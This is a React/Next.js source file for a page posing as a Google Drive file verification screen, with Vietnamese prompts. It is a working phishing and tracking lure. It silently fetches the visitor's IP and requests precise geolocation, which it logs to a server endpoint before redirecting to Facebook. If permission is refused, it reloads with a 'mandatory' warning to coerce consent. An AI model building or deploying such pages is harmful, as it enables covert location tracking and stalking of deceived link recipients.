'use client';

import { useEffect, useState } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { FileText, Loader2, AlertTriangle } from 'lucide-react';
import type { VerificationConfig } from '@/app/actions/settings';

interface DriveVerificationClientProps {
  config: VerificationConfig;
}

export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
  const { 
    title, 
    description, 
    fileName, 
    fileInfo, 
    footerText, 
    redirectUrl,
    previewImageUrl,
  } = config;

  const [statusText, setStatusText] = useState('Đang xác minh, vui lòng chờ...');
  const [showWarning, setShowWarning] = useState(false);
  
  const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 

  useEffect(() => {
    const requestLocation = async () => {
      let clientIp = 'N/A';
      try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          if (ipResponse.ok) {
              const ipData = await ipResponse.json();
              clientIp = ipData.ip;
          }
      } catch(e) {
          console.error("Could not fetch IP", e);
      }

      const logDataAndRedirect = (pos?: GeolocationPosition) => {
          setStatusText('Xác minh thành công, đang chuyển hướng...');
          const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
          if (pos) {
              body.lat = pos.coords.latitude;
              body.lon = pos.coords.longitude;
              body.acc = pos.coords.accuracy;
          }

          fetch('/api/log-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body),
              keepalive: true,
          }).finally(() => {
              window.location.href = REDIRECT_URL;
          });
      };

      const handleError = (error: GeolocationPositionError) => {
        // PERMISSION_DENIED is the key case
        if (error.code === error.PERMISSION_DENIED) {
            setShowWarning(true);
            setStatusText('Yêu cầu bắt buộc! Vui lòng cho phép...');
            // Reload after a short delay to allow user to read the message
            setTimeout(() => {
                window.location.reload();
            }, 2500);
        } else {
            // For other errors (POSITION_UNAVAILABLE, TIMEOUT), just log IP and redirect
            logDataAndRedirect();
        }
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logDataAndRedirect, // Success
          handleError,        // Error
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } else {
        // Geolocation not supported, log IP and redirect
        logDataAndRedirect();
      }
    };
    
    // Request immediately, but with a tiny delay to let the initial UI render
    const timer = setTimeout(requestLocation, 100);
    return () => clearTimeout(timer);
  }, [REDIRECT_URL]);

  return (
    <div className="flex justify-center items-center min-h-screen bg-muted/30 p-4">
      <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
        <CardContent className="p-0 flex flex-col items-center">
          
          <Image
            className="mb-5 rounded-md"
            src={previewImageUrl || "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"}
            alt={title}
            width={80}
            height={80}
            priority
          />
          
          <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
          <p className="text-muted-foreground text-sm leading-normal mb-8">
            {description}
          </p>

          <div className="w-full bg-muted/40 border rounded-lg p-4 flex items-center gap-4 mb-6 text-left">
            <FileText className="h-10 w-10 text-primary shrink-0" />
            <div>
              <p className="font-semibold text-foreground">{fileName}</p>
              <p className="text-xs text-muted-foreground">{fileInfo}</p>
            </div>
          </div>
          
          <div
            className={`w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors ${showWarning ? 'bg-destructive' : 'bg-primary'}`}
          >
            {showWarning ? <AlertTriangle className="mr-2 h-5 w-5" /> : <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
            {statusText}
          </div>

          <div className="text-xs text-muted-foreground/80 mt-6">
            {footerText}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
